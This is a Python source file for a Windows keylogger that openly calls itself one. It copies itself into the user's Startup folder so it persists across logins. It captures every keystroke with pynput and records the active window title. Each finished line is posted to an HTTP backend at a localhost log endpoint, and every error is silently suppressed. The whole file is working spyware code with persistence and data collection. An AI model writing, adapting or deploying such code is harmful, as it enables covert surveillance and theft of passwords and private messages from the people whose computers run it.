import os
import shutil
import sys
from pathlib import Path

def add_to_startup():
    # Get path to Startup folder
    startup_dir = os.path.join(
        os.environ["APPDATA"],
        r"Microsoft\Windows\Start Menu\Programs\Startup"
    )
    script_path = Path(sys.argv[0]).resolve()
    script_name = script_path.name
    target_path = os.path.join(startup_dir, script_name)

    # Only copy if not already there
    if not os.path.exists(target_path):
        try:
            shutil.copyfile(script_path, target_path)
        except Exception as e:
            pass  # You can add logging here if you wish

# Call at the top so it only happens once
add_to_startup()

# ...rest of your keylogger code below...
from pynput import keyboard
import requests
import win32gui

class Keylogger:
    def __init__(self):
        self.api_url = "http://localhost:5000/log"
        self.current_line = []
        self.is_running = True
        self.session = requests.Session()

    def get_window_title(self):
        try:
            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
        except:
            return "Unknown Window"

    def format_key(self, key):
        try:
            return key.char
        except AttributeError:
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.backspace: "[BACK]",
                keyboard.Key.delete: "[DEL]",
            }
            return special_keys.get(key, "")

    def send_to_backend(self, text, window_title):
        try:
            data = {
                "keys": text,
                "window": window_title
            }
            self.session.post(
                self.api_url,
                json=data,
                headers={"Content-Type": "application/json"},
                timeout=1
            )
        except requests.exceptions.RequestException:
            pass

    def handle_backspace(self):
        if self.current_line:
            self.current_line.pop()

    def on_press(self, key):
        try:
            if key == keyboard.Key.enter:
                if self.current_line:
                    text = ''.join(self.current_line)
                    window_title = self.get_window_title()
                    self.send_to_backend(text, window_title)
                    self.current_line = []
                return True
            if key == keyboard.Key.backspace:
                self.handle_backspace()
                return True
            key_char = self.format_key(key)
            if key_char:
                self.current_line.append(key_char)
            return True
        except Exception:
            return True

    def start(self):
        with keyboard.Listener(
            on_press=self.on_press,
            suppress=False
        ) as listener:
            try:
                listener.join()
            except KeyboardInterrupt:
                self.is_running = False
                if self.current_line:
                    text = ''.join(self.current_line)
                    window_title = self.get_window_title()
                    self.send_to_backend(text, window_title)

if __name__ == "__main__":
    try:
        keylogger = Keylogger()
        keylogger.start()
    except Exception:
        pass